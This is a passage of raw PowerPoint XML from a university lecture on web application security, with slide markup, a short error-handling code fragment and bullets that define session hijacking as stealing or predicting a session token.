                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>handle</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25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8000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35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dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>*/</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>}.catch(err){</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342265">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>next(err);</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="5"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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397755" y="22858"/>
            <a:ext cx="5794243" cy="6835139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962050" y="3005708"/>
            <a:ext cx="6402705" cy="75692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4800" spc="-80"/>
              <a:t>SESSION</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-250"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-10"/>
              <a:t>HIJACKING</a:t>
            </a:r>
            <a:endParaRPr sz="4800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="object 4" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4117975" y="6335674"/>
            <a:ext cx="3897629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solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-40">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-45">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-45">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Federico </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="5">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-5">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Security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11049761" y="6427114"/>
            <a:ext cx="18097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25">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>38</a:t>
            </a:r>
            <a:endParaRPr sz="1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50"/>
              <a:t>SESSION</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-215"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>HIJACKING</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="object 3" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="882595" y="3451097"/>
            <a:ext cx="3124835" cy="2459355"/>
            <a:chOff x="882595" y="3451097"/>
            <a:chExt cx="3124835" cy="2459355"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="4" name="object 4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82595" y="3451097"/>
              <a:ext cx="965762" cy="1003522"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="object 5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128402" y="4887086"/>
              <a:ext cx="712841" cy="1023048"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="object 6" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3086099" y="3505199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914400" h="914400">
                  <a:moveTo>
                    <a:pt x="762000" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="152400" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104217" y="7766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62380" y="29394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29394" y="62380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7766" y="104217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="152400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="762000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7766" y="810182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29394" y="852019"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62380" y="885005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104217" y="906633"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152400" y="914400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="762000" y="914400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="810182" y="906633"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="852019" y="885005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="885005" y="852019"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="906633" y="810182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="914400" y="762000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="914400" y="152400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="906633" y="104217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="885005" y="62380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="852019" y="29394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="810182" y="7766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="762000" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="00637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 descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3086099" y="3505199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914400" h="914400">
                  <a:moveTo>
                    <a:pt x="0" y="152400"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7766" y="104217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29394" y="62380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62380" y="29394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104217" y="7766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152400" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="762000" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="810182" y="7766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="852019" y="29394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="885005" y="62380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="906633" y="104217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="914400" y="152400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="914400" y="762000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="906633" y="810182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="885005" y="852019"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="852019" y="885005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="810182" y="906633"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="762000" y="914400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152400" y="914400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104217" y="906633"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62380" y="885005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29394" y="852019"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7766" y="810182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="762000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="152400"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="00252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 descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1878330" y="3963161"/>
              <a:ext cx="1208405" cy="0"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="1208405" h="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1208405" y="0"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="38100">
              <a:solidFill>
                <a:srgbClr val="D70031"/>
              </a:solidFill>
              <a:prstDash val="sysDash"/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 descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2424683" y="4060697"/>
              <a:ext cx="114300" cy="799465"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="114300" h="799464">
                  <a:moveTo>
                    <a:pt x="76200" y="95250"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="38100" y="95250"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38100" y="799464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="76200" y="799464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="76200" y="95250"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="114300" h="799464">
                  <a:moveTo>
                    <a:pt x="57150" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="114300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38100" y="114300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38100" y="95250"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104775" y="95250"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57150" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="114300" h="799464">
                  <a:moveTo>
                    <a:pt x="104775" y="95250"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="76200" y="95250"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="76200" y="114300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="114300" y="114300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104775" y="95250"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="D70031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0" name="object 10" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="962050" y="1446872"/>
            <a:ext cx="9709150" cy="1050925"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="98425" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="775"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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aimed</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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at</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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compromising</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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session</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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token</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="675"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Typically</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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performed</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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by</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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stealing</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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valid</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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token,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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or</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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by</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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predicting</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>one</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="11" name="object 11" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4514262" y="3451097"/>
            <a:ext cx="3124835" cy="2459355"/>
            <a:chOff x="4514262" y="3451097"/>
            <a:chExt cx="3124835" cy="2459355"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="12" name="object 12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514262" y="3451097"/>
              <a:ext cx="965787" cy="1003522"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="13" name="object 13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510021" y="3498849"/>
              <a:ext cx="2128520" cy="2411285"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="14" name="object 14" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8184053" y="3451097"/>
            <a:ext cx="3122930" cy="2459355"/>
            <a:chOff x="8184053" y="3451097"/>
            <a:chExt cx="3122930" cy="2459355"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="15" name="object 15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8184053" y="3451097"/>
              <a:ext cx="965787" cy="1003522"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="16" name="object 16" descr="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9178289" y="3498849"/>
              <a:ext cx="2128519" cy="2411285"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="17" name="object 17" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="978153" y="2736850"/>
            <a:ext cx="2981960" cy="624205"/>
            <a:chOff x="978153" y="2736850"/>
            <a:chExt cx="2981960" cy="624205"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="18" name="object 18" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="984503" y="2743200"/>
              <a:ext cx="2969260" cy="611505"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2969260" h="611504">
                  <a:moveTo>
                    <a:pt x="2866898" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="101854" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62209" y="8002"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29833" y="29829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8004" y="62204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="101853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="509270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8004" y="548919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29833" y="581294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62209" y="603121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101854" y="611124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2866898" y="611124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2906547" y="603121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2938922" y="581294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2960749" y="548919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2968752" y="509270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2968752" y="101853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2960749" y="62204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2938922" y="29829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2906547" y="8002"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2866898" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="D7003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9" name="object 19" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="984503" y="2743200"/>
              <a:ext cx="2969260" cy="611505"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2969260" h="611504">
                  <a:moveTo>
                    <a:pt x="0" y="101853"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8004" y="62204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29833" y="29829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62209" y="8002"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101854" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2866898" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2906547" y="8002"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2938922" y="29829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2960749" y="62204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2968752" y="101853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2968752" y="509270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2960749" y="548919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2938922" y="581294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2906547" y="603121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2866898" y="611124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101854" y="611124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62209" y="603121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29833" y="581294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8004" y="548919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="509270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="101853"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
